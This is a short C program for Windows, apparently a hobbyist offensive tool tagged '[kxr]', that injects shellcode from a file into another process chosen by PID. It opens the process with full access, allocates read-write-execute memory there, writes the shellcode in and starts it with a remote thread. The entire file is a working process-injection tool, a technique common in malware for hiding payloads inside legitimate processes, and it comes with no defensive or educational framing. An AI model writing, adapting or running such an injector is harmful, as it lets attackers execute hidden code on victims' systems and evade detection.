#include <windows.h>
#include <stdio.h>

DWORD targetProcessID, exitCode = NULL;
HANDLE targetProcess = NULL, remoteThread = NULL;
LPVOID remoteShellcode = NULL;

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("[kxr] | Usage: %s <PID> <Shellcode_File_Path>\n", argv[0]);
        return EXIT_FAILURE;
    }

    targetProcessID = atoi(argv[1]);
    printf("[kxr] | Hooking Process <%ld>\n", targetProcessID);

    /* Create Process */
    targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessID);
    printf("[kxr] | Hooked Process!\n\\---0x%p\n", targetProcess);

    /* Is targetProcess NULL? */
    if (targetProcess == NULL) {
        printf("[kxr] | Couldn't Hook Process <%ld>. With error: <%ld>\n", targetProcessID, GetLastError());
        return EXIT_FAILURE;
    }

    /* Read shellcode from file */
    FILE* shellcodeFile = fopen(argv[2], "rb");
    if (shellcodeFile == NULL) {
        printf("[kxr] | Unable to open Shellcode file <%s>\n", argv[2]);
        CloseHandle(targetProcess);
        return EXIT_FAILURE;
    }

    fseek(shellcodeFile, 0, SEEK_END);
    size_t fileSize = ftell(shellcodeFile);
    fseek(shellcodeFile, 0, SEEK_SET);

    unsigned char* shellcode = (unsigned char*)malloc(fileSize);
    fread(shellcode, 1, fileSize, shellcodeFile);
    fclose(shellcodeFile);

    printf("[kxr] | Read %zu-bytes Shellcode from file <%s>\n", fileSize, argv[2]);

    /* Allocate shellcode to Process */
    remoteShellcode = VirtualAllocEx(targetProcess, NULL, fileSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    printf("[kxr] | Allocated %zu-bytes with RWX Perms | <ReadWriteExecute>\n", fileSize);

    /* Write the allocated memory to process */
    WriteProcessMemory(targetProcess, remoteShellcode, shellcode, fileSize, NULL);
    printf("[kxr] | Wrote %zu-bytes to Process <%ld>\n", fileSize, targetProcessID);

    /* Create thread to run shellcode */
    remoteThread = CreateRemoteThreadEx(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteShellcode, NULL, 0, 0, &exitCode);

    if (remoteThread == NULL) {
        printf("[kxr] | Failed to create thread. With error: %ld\n", GetLastError());
        CloseHandle(targetProcess);
        free(shellcode);
        return EXIT_FAILURE;
    }

    printf("[kxr] | Created Thread <%ld>\n\\---0x%p\n", exitCode, remoteThread);

    printf("[kxr] | GG'S. Closing all Thread's and Handle's\n");
    CloseHandle(remoteThread);
    CloseHandle(targetProcess);
    free(shellcode);

    return EXIT_SUCCESS;
}
